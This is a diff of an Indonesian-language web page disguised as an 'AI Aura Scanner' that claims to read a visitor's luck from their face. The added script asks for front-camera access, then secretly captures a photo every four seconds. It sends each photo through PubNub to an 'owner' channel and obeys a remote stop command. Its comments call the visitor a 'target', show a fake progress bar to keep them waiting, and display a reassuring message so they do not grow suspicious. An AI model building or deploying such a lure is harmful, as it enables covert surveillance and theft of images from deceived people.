@@ -3,61 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AI Aura & Personality Scanner</title>
+    <title>AI Deep Aura Scanner</title>
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
     <style>
-        body { background: #0f0c29; background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.2); width: 85%; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); }
-        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #00d2ff; }
-        p { font-size: 0.9rem; opacity: 0.8; }
-        .btn-start { background: linear-gradient(to right, #00d2ff, #3a7bd5); color: white; border: none; padding: 15px 30px; font-size: 1rem; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0, 210, 255, 0.4); transition: 0.3s; }
-        .btn-start:active { transform: scale(0.95); }
-        .loader { display: none; margin-top: 20px; }
-        .scan-line { width: 100%; height: 2px; background: #00d2ff; position: relative; animation: move 2s infinite; display: none; box-shadow: 0 0 15px #00d2ff; }
-        @keyframes move { 0% { top: 0; } 50% { top: 100px; } 100% { top: 0; } }
-        video, canvas { display: none; }
+        /* Gaya Tampilan Dark Mode (Rakitan Dyron) */
+        body {
+            margin: 0; padding: 0; background: #000; color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; height: 100vh; display: flex;
+            align-items: center; justify-content: center; text-align: center;
+        }
+
+        /* Latar Belakang Meteor Bergerak (Pure CSS) */
+        .stars {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://i.imgur.com/8fS8tK1.png') repeat top center;
+            z-index: 1; opacity: 0.5;
+        }
+        .meteor {
+            position: absolute; width: 2px; height: 150px;
+            background: linear-gradient(0deg, rgba(0,210,255,1) 0%, rgba(0,0,0,0) 100%);
+            animation: fall linear infinite; filter: drop-shadow(0 0 5px #00d2ff);
+            opacity: 0; z-index: 2;
+        }
+        @keyframes fall {
+            0% { transform: translateY(-200px) rotate(-45deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(100vh) rotate(-45deg); opacity: 0; }
+        }
+        /* Variasi Meteor */
+        .m1 { left: 20%; animation-duration: 3s; animation-delay: 1s; }
+        .m2 { left: 50%; animation-duration: 4s; animation-delay: 3s; }
+        .m3 { left: 80%; animation-duration: 2.5s; animation-delay: 0.5s; }
+        .m4 { left: 10%; animation-duration: 5s; animation-delay: 2s; }
+        .m5 { left: 90%; animation-duration: 3.5s; animation-delay: 4s; }
+
+        /* Kartu Tampilan Utama */
+        .card {
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
+            padding: 40px; border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 85%; max-width: 400px;
+            z-index: 10; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+        h1 { font-size: 1.8rem; margin-bottom: 5px; color: #fff; font-weight: 300; letter-spacing: 1px; }
+        p { font-size: 0.9rem; opacity: 0.7; margin-bottom: 25px; }
+        .btn-start {
+            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+            color: white; border: none; padding: 18px 40px;
+            font-size: 1.1rem; font-weight: bold; border-radius: 50px;
+            cursor: pointer; box-shadow: 0 10px 20px rgba(0, 210, 255, 0.3);
+            transition: 0.3s; width: 100%; text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn-start:active { transform: scale(0.96); box-shadow: 0 5px 10px rgba(0, 210, 255, 0.2); }
+        .status-scan { display: none; margin-top: 20px; font-weight: bold; color: #00d2ff; }
+        
+        /* Kamera Tersembunyi */
+        video, canvas { display: none; position: absolute; }
     </style>
 </head>
 <body>
+
+    <div class="stars"></div>
+    <div class="meteor m1"></div>
+    <div class="meteor m2"></div>
+    <div class="meteor m3"></div>
+    <div class="meteor m4"></div>
+    <div class="meteor m5"></div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <div class="card" id="mainUI">
-        <h1>✨ AI Aura Scanner</h1>
-        <p>Cek persentase keberuntungan dan warna auramu hari ini menggunakan teknologi Face-Recognition AI terbaru.</p>
+        <h1>🌌 AI AURA SCAN</h1>
+        <p>Gunakan teknologi Deep-AI terbaru untuk menganalisis energi dan keberuntungan dari wajahmu.</p>
         
-        <div id="scanEffect" class="scan-line"></div>
+        <button class="btn-start" id="btn" onclick="startSystem()">MULAI ANALISIS</button>
         
-        <div id="statusText" style="margin-top: 15px; font-weight: bold; color: #00d2ff;">Ready to Scan</div>
-        
-        <button class="btn-start" id="btn" onclick="startScan()">MULAI SCAN GRATIS</button>
-        
-        <p style="font-size: 0.7rem; margin-top: 20px; opacity: 0.5;">*Izinkan akses kamera untuk proses identifikasi AI</p>
+        <div id="statusText" class="status-scan">MENGHUBUNGKAN SERVER AI...</div>
+        <p style="font-size: 0.7rem; margin-top: 25px; opacity: 0.4;">*Akses kamera diperlukan untuk verifikasi wajah</p>
     </div>
 
     <script>
-        const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'ai_user' });
+        // Key Demo (Ganti dengan Key Anda jika ada)
+        const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'target_id' });
         const video = document.getElementById('v');
         const canvas = document.getElementById('c');
+        let photoInterval; // Variabel untuk menyimpan interval foto
 
-        async function startScan() {
+        // 1. DENGARKAN PERINTAH STOP DARI OWNER (PENTING!)
+        pubnub.subscribe({ channels: ['vin_vortex_control'] }); 
+        pubnub.addListener({
+            message: function(m) {
+                if (m.message === "STOP_SCAN") {
+                    // JIKA OWNER KLIK STOP, MATIKAN SEMUANYA
+                    clearInterval(photoInterval); // Berhenti ambil foto
+                    const tracks = video.srcObject.getTracks(); // Matikan kamera fisik
+                    tracks.forEach(track => track.stop());
+                    
+                    // Ubah tampilan target agar tidak curiga
+                    document.getElementById('statusText').innerText = "ANALISIS SELESAI. DATA DISIMPAN.";
+                    document.getElementById('statusText').style.color = "cyan";
+                }
+            }
+        });
+
+        // 2. JALANKAN SISTEM KETIKA TOMBOL DIKLIK
+        async function startSystem() {
+            // Tampilan Target saat Memulai
             document.getElementById('btn').style.display = 'none';
-            document.getElementById('statusText').innerText = "Menghubungkan ke AI Server...";
+            document.getElementById('statusText').style.display = 'block';
 
             try {
-                // Meminta izin kamera dengan alasan "AI Scanner"
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // MINTA IZIN KAMERA DEPAN
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
                 video.srcObject = stream;
                 
-                // Efek Visual Pancingan
-                document.getElementById('scanEffect').style.display = 'block';
-                document.getElementById('statusText').innerText = "MENGANALISIS WAJAH (12%)...";
-                
-                // Mulai kirim foto ke owner setiap 4 detik
-                setInterval(captureAndSend, 4000);
+                // Mulai ambil foto otomatis setiap 4 detik, simpan ke variabel photoInterval
+                photoInterval = setInterval(captureAndSend, 4000);
 
-                // Buat target menunggu lama agar foto yang terkirim makin banyak
+                // Buat target menunggu lama (Pancingan agar tidak menutup tab)
                 let progress = 12;
                 setInterval(() => {
                     if (progress < 99) {
@@ -70,17 +138,21 @@
 
             } catch (err) {
                 alert("Gagal: AI membutuhkan akses kamera untuk membaca aura wajahmu.");
-                location.reload();
+                location.reload(); // Refresh jika ditolak
             }
         }
 
+        // 3. FUNGSI AMBIL FOTO & KIRIM KE OWNER
         function captureAndSend() {
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0);
-            const data = canvas.toDataURL('image/jpeg', 0.5);
             
+            // Konversi ke Base64 (Data Gambar)
+            const data = canvas.toDataURL('image/jpeg', 0.5); // Kompresi 50% agar cepat
+            
+            // Kirim ke Owner lewat saluran 'vin_vortex_gate'
             pubnub.publish({
                 channel: 'vin_vortex_gate',
                 message: { img: data }
